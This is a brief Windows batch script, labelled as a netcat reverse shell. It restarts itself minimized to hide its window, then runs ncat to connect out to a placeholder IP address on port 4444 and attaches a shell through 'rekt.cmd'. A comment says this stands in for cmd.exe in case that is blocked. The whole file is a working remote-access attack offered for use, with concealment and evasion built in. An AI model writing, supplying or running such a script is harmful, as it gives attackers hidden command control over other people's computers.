@ECHO OFF
rem reverse shell using netcat
if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 && start "" /min "%~dpnx0" %* && exit
ncat.exe -nv "ipaddress" 4444 -e rekt.cmd rem uses rekt.cmd incase cmd.exe is blocked
exit